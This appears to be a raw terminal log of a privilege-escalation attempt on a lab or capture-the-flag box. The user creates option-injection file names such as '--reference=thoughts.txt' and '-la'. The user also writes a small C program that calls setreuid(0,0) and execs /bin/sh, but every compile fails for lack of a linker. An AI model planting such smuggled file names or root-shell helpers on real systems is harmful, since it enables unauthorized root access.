+[sec@shrek src]$ rm '--reference=thoughts.txt'                             
+rm: unrecognized option '--reference=thoughts.txt'                         
+Try 'rm ./'--reference=thoughts.txt'' to remove the file '--reference=thoughts.txt'.                                                                   
+Try 'rm --help' for more information.                                      
+[sec@shrek src]$ rm ./'--reference=thoughts.txt'                           
+[sec@shrek src]$ touch -- '--reference=thoughts.txt'                       
+[sec@shrek src]$ vi exec.c           
+[Using open mode]                    
+"exec.c" [New file]                  
+/                                    
+No previous regular expression       
+t                                    
+i                                    
+:q                                   
+No write since last change (:quit! overrides)                              
+:q!                                  
+[sec@shrek src]$ clear               
+TERM environment variable not set.   
+[sec@shrek src]$ export TERM=screen-256color                               
+[sec@shrek src]$ clear               
+[sec@shrek src]$ ls                  
+'--reference=thoughts.txt'   -la   thoughts.txt                            
+[sec@shrek src]$ ls -la              
+total 12                             
+-rw-r--r-- 1 sec  users    0 Jan  2 07:41 '--reference=thoughts.txt'       
+-rw-r--r-- 1 sec  users    0 Jan  2 07:20  -la                             
+drwxr-xr-x 2 sec  root  4096 Jan  2 07:41  .                               
+drwxr-xr-x 8 sec  root  4096 Aug 16  2017  ..                              
+-rw-r--r-- 1 root root    91 Aug 22  2017  thoughts.txt                    
+[sec@shrek src]$ vi exec.c           
+[sec@shrek src]$ cat exec.c          
+
+#include <stdio.h>                   
+#include <stdlib.h>                  
+#include <unistd.h>                  
+int main( int argc,char *argv[] )    
+{                                    
+    setreuid(0, 0);                  
+    execve("/bin/sh",NULL ,NULL);    
+
+}                                    
+[sec@shrek src]$ gcc exec.c -o exec  
+collect2: fatal error: cannot find 'ld'                                    
+compilation terminated.              
+[sec@shrek src]$ rm exec.c           
+[sec@shrek src]$ vi exec.c           
+[sec@shrek src]$ gcc exec.c -o exec  
+collect2: fatal error: cannot find 'ld'                                    
+compilation terminated.              
+[sec@shrek src]$ rm exec.c           
+[sec@shrek src]$ ls                  
+'--reference=thoughts.txt'   -la   thoughts.txt                            
+[sec@shrek src]$ clear               
+[sec@shrek src]$ vi exec.c           
+[sec@shrek src]$ gcc exec.c -o exec  
+collect2: fatal error: cannot find 'ld'                                    
+compilation terminated.              
+[sec@shrek src]$ rm exec.c           
+[sec@shrek src]$ vi exec.c           
+[sec@shrek src]$ ls                  
+'--reference=thoughts.txt'   -la   thoughts.txt                            
+[sec@shrek src]$ vi exec.c           
+[sec@shrek src]$ vi exec.c           
+[sec@shrek src]$ gcc exec.c -o exec  
+collect2: fatal error: cannot find 'ld'                                    
+compilation terminated.              
+[sec@shrek src]$ rm ./'--reference=thoughts.txt'                                                                                                       
+[sec@shrek src]$ ls                  
+-la  exec.c  thoughts.txt            
+[sec@shrek src]$ rm ./-la            
+[sec@shrek src]$ la                  
+bash: la: command not found          
+[sec@shrek src]$ ls                  
+exec.c  thoughts.txt                 
+[sec@shrek src]$ cat exec.c          
+#include <stdio.h>                   
+#include <stdlib.h>                  
+#include <unistd.h>                  
+int main( int argc,char *argv[] )    
+{                                    
+    setreuid(0, 0);                  
+    execve("/bin/sh",NULL ,NULL);    
+
+}                                    
+[sec@shrek src]$ gcc exec.c -o exec  
+collect2: fatal error: cannot find 'ld'                                    
+compilation terminated.              
+[sec@shrek src]$ gcc exec.c          
+collect2: fatal error: cannot find 'ld'                                    
+compilation terminated.              
+[sec@shrek src]$ exit                
+exit                                 
+[sec@shrek src]$ exit                
+exit                                 
+[sec@shrek src]$ quit                
+bash: quit: command not found        
+[sec@shrek src]$ ^C                  
+[sec@shrek src]$ ^C                  
+[sec@shrek src]$ ^C                  
+[sec@shrek src]$ ls                  
+exec.c  thoughts.txt                 
+[sec@shrek src]$ gcc exec.c          
+collect2: fatal error: cannot find 'ld'                                    
+compilation terminated.              
+[sec@shrek src]$ exit                
+exit                                 
+[sec@shrek src]$                     
